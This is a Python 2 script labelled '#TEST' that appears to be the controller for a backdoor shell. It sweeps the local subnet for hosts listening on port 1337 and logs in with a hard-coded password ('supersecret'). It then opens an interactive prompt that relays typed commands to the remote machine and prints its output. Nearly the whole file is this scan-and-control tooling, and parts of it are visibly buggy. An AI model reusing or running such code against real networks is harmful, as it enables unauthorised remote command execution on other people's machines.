#TEST

from subprocess import Popen, STDOUT, PIPE
import socket
from time import strftime, sleep
import sys
import subprocess

def tryconn(HOST, PORT):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.connect((HOST, PORT))
	print 'Connected to:', HOST
	s.sendall("info")
	resp = s.recv(1024)
	return resp;
def conn(HOST):
	while True:
		PORT = 1337
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.connect((HOST, PORT))
		print 'Connected to:', HOST
		s.sendall("supersecret")
		
		who = getwho()
		#prnt = bc.GREEN + who + bc.ENDC + "@" + bc.RED + HOST + bc.ENDC + "~$ "	
		while True:
				time= timestamp()
				data = raw_input("%s %s@%s~$ " % (time, who, HOST))
				if data == "close" or data == "sclose":
					s.sendall(data)
					s.shutdown(1)
					s.close()
					sys.exit()
				s.sendall(data)
				resp = s.recv(1024)
				if not resp: break
				resp = list(resp)
				del resp[-1]
				resp = ''.join(resp)
				print resp
def getinfo():
	info = "THIS IS TESTING"
	return info;
def getip():
	try:
		command = "ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'"
		proc2=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, )
		output2=proc2.communicate()[0]
		filtr1=list(output2)
		del filtr1[-1]
		ip=''.join(filtr1)
		return ip;
	except:
		print "error"
		return "IP_ERROR";

def getwho():
	p3=Popen("whoami", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
	output3=p3.stdout.read()
	who = output3.split()[0]
	return who;

def timestamp():
	time = "[" + strftime("%Y-%m-%d %H:%M:%S") + "]"
	return time;

def scanall():
	class opts:
		ips = getip().split('.')
		del ips [-1]
		ips.append("1-255")
		iprange = '.'.join(ips)
		print "Scan range is: %s"  % iprange
		delay = .1
		print "Delay is: ", delay
		port = 1337
		print "Port is ", port
	if opts.iprange is None:
		print "you must supply an IP range"
	ips=[]
	working = []
	workip = []

	octets = opts.iprange.split('.')

	start = octets[3].split('-')[0]
	stop = octets[3].split('-')[1]

	for i in range(int(start), int(stop)+1):
		ips.append('%s.%s.%s.%d' % (octets[0], octets[1], octets[2], i))

	print '\nScanning IPs: %s\n' % (ips)

	for ip in ips:
		print ip
		try:
			info = tryconn(ip, opts.port)
			print info
			workip.append(ip)
			working.append("""
	IP: %s
	PORT: %s
	INFO: %s""" % (ip, opts.port, info))
		except socket.error as s:
			print "%s:%s : Connection refused" % (ip, opts.port)
			print "Callback:", s
		sleep(float(opts.delay))

	for c in range(len(working)):
		print "[%s] %s" % (c, working[c])

		print "Do you want to connect with this host?"
		print "(Hosts discovered: %s)"
		reply = raw_input("y/n? ")
		if reply == "y" or reply =="yes":
			conn(workip[c])
		else:
			print "NEXT HOST:"
	

class bc:
	PINK = '\033[95m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	ENDC = '\033[0m'
print """
Would you like to:
	1. Enter a HOST to connect to (IP KNOWN)
	2. Scan for available hosts (IP UNKNOWN)

	WARNING: Option 2 may take a while...

"""
x = raw_input("> ")
if x == "1":
	while True:
		try:
			HOST = raw_input("> ")
			print "Host is:", HOST
			if HOST == "close":
				sys.exit()
			else:
				conn(HOST)

		except Exception as e:
			print e
			print "Oops!  That was no valid host.  Try again..."
elif x == "2":
	hosts = scanall()
	print "Oops, no hosts found. Exiting"
	sys.exit()
else:
	"ERROR!"
	sys.exit()
